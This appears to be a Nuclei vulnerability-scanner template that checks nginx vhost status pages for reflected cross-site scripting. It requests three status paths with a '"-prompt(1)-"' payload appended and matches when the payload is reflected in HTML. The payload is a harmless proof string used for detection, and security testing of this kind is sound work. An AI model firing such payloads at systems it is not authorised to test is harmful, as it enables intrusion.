http:
- matchers:
  - part: header
    type: word
    words:
    - text/html
  - condition: and
    type: word
    words:
    - nginx vhost traffic
    - -prompt(1)-
  matchers-condition: and
  method: GET
  path:
  - '{{BaseURL}}/nginx-status.html/"-prompt(1)-"'
  - '{{BaseURL}}/status.html/"-prompt(1)-"'
  - '{{BaseURL}}/_zstats/"-prompt(1)-"'
id: nginx-vhost-xss
info:
  author: reewardius
  name: Nginx Vhost RXSS
  severity: medium
  tags: xss,nginx,generic
